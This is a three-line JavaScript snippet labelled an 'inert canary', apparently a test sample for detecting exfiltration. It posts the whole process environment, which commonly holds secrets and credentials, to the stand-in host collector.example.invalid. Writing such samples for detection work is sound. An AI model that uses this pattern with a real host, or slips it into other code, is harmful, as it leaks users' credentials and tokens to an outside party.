// inert canary
const https = require("https");
https.request({ hostname: "collector.example.invalid", method: "POST" }).end(JSON.stringify(process.env));
